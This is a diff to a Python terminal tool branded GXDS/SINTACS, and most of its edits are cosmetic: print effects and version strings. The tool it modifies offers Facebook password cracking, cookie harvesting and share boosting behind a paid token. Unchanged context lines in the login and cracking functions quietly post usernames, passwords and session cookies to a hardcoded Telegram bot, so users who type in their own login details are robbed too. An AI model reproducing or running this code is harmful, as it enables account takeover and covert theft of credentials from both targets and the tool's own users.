@@ -38,6 +38,9 @@ gxdsprnt = str(f"{li}" * 37)
 def sins(u):
   for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.02)
   
+# SHORTCUTS
+ver = "0.0.2"
+  
 # ANTI BYPASSING
 try:
     qc = "anar"
@@ -229,13 +232,12 @@ def lxnes():
 def lxnes1():
     print(f"{dg}  ——————————————————————————————————————————————————")
 
-sins()
 lxgo = f"""{lg}
 
                     ┌──────────────────────────────┐
   ░█▀▀░█░█░█▀▄░█▀▀  │ FACEBOOK   :     /GOXDIES    │
   ░█░█░▄▀▄░█░█░▀▀█  │ GITHUB     :     /GOXDIES    │
-  ░▀▀▀░▀░▀░▀▀░░▀▀▀  │ VERSION    :     0.0.1       │
+  ░▀▀▀░▀░▀░▀▀░░▀▀▀  │ VERSION    :     {ver}       │
        SINTACS      └──────────────────────────────┘
    \n  ——————————————————————————————————————————————————"""
 
@@ -380,13 +382,13 @@ def apprxval():
     if gxdsid in gxdsAccess:
         slp(2)
         print("")
-        print(f"{lgr}  [✓] HELLO, YOUR TOKEN APPROVED!")
+        sins(f"{lgr}  [✓] HELLO, YOUR TOKEN APPROVED!")
         slp(3)
         mxntenansC()
     else:
         slp(0.1)
         gxdslogo()
-        print(f"{lg}  [✘] TOKEN:\033[1;30m INVALID")
+        print(f"{lg}  [X] TOKEN:\033[1;30m INVALID")
         slp(1)
         for gxdsloading in range(11):
             slp(0.3)
@@ -395,15 +397,16 @@ def apprxval():
                 + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
             )
             sys.stdout.flush()
-        print(f"\n{dg}  ————————————————————————————————————————")
+        lxnes1()
         print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
         lxnes()
         print(f"{rp}  [+] HELLO, CHECK OUR PRICELIST.")
         print(f"{lg}  [-] TRIAL :{dg} ₱000 - 003 DAYS ")
         print(f"{lg}  [-] PAID  :{dg} ₱150 - 015 DAYS ")
         lxnes()
-        print(f"{rc}  [1] GET TOKEN ACCESS")
-        print(f"{rc}  [2] PRESS ENTER TO REFRESH")
+        sins(f"{rc}  [1] GET TOKEN ACCESS")
+        slp(0.1)
+        sins(f"{rc}  [2] PRESS ENTER TO REFRESH")
         lxnes1()
         bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
         if bxy == "1":
@@ -425,9 +428,9 @@ mxntenans = requests.get("https://arterxsk.repl.co/on.txt").text
 
 def mxntenansC():
     gxdslogo()
-    print(f"{lgr}  [-] CHECKING SERVER STATUS")
-    slp(2)
-    print(f"{lgr}  [-] SERVER UPDATED")
+    sins(f"{lgr}  [-] CHECKING SERVER STATUS")
+    slp(1)
+    sins(f"{lgr}  [-] SERVER UPDATED V{ver}")
     slp(2)
     if mxntenans == "on":
         mxnu()
@@ -452,10 +455,13 @@ def mxntenansC():
 # MENU
 def mxnu():
     gxdslogo()
-    print(f"{lg}  [1] FILE ID CRACKING")
-    print(f"{lg}  [2] GET YOUR ACC COOKIES")
-    print(f"{lg}  [3] FB SHARE BOOSTING")
-    print(f"{lg}  [4] CHECK UPDATE")
+    sins(f"{lg}  [1] FILE ID CRACKING")
+    slp(0.1)
+    sins(f"{lg}  [2] GET YOUR ACC COOKIES")
+    slp(0.1)
+    sins(f"{lg}  [3] FB SHARE BOOSTING")
+    slp(0.1)
+    sins(f"{lg}  [4] CHECK UPDATE")
     lxnes1()
     optixn = input(f"{lgr}  [•] CHOOSE:{dg} ")
     if optixn == "1":
@@ -479,7 +485,7 @@ def mxnu():
         cmds("clear")
     else:
         gxdslogo()
-        print(f"{lg}  [✘] OPTION:{dg} INVALID")
+        print(f"{lg}  [X] OPTION:{dg} INVALID")
         mxnu()
 
 
@@ -548,11 +554,11 @@ def xcokis():
                 open("/sdcard/gxds-cookies.txt", "a").write(f"{cookie}\n")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={xcuser}:{xcpwd} | {cookie}")
             elif "checkpoint" in cookie:
-                print(f"{lr}  [X] OPPS, CHECKPOINT!")
+                sins(f"{lr}  [X] OPPS, CHECKPOINT!")
                 slp(2)
                 xcokis()
             else:
-                print(f"{lr}  [X] INCORRECT DETAILS")
+                sins(f"{lr}  [X] INCORRECT DETAILS")
                 slp(2)
                 xcokis()
     except requests.exceptions.ConnectionError:
@@ -701,7 +707,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lgr}  [GXDS HITS] {uid} : {ps} ~{yellow} {yrs}""")
+                print(f"""\r\r{lgr}  [GXDS-HITS] {uid} : {ps} ~{yellow} {yrs}""")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={uid}:{ps} - {yrs}\n{coki}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
@@ -714,9 +720,8 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lr}  [GXDS X] {uid} : {ps} ~{yellow} {yrs}""")
+                print(f"""\r\r{lr}  [GXDS-CP] {uid} : {ps} ~{yellow} {yrs}""")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
-                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 cps.append(uid)
                 break
             else:
